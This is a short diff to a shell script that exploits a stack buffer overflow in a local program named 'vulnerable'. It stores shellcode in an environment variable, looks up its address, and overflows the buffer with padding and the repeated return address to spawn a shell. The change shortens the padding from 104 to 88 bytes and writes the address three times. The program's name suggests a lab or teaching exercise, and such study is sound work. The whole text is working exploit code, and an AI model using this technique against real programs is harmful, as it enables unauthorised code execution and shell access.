@@ -11,6 +11,6 @@ export EGG=$(python3 -c "import sys; sys.stdout.buffer.write(b'\x31\xc0\x48\xbb\
 addr=$(./getenvaddress EGG ./vulnerable | grep -e "0x[0-9a-fA-F]*" -o)
 # Overflow stack buffer and spawn a shell
 (
-    python3 -c "from struct import pack; import sys; sys.stdout.buffer.write(b'A' * 104 + pack('<Q', $(echo $addr)))"
+    python3 -c "from struct import pack; import sys; sys.stdout.buffer.write(b'A' * 88 + pack('<Q', $(echo $addr)) * 3)"
     cat
 ) | ./vulnerable
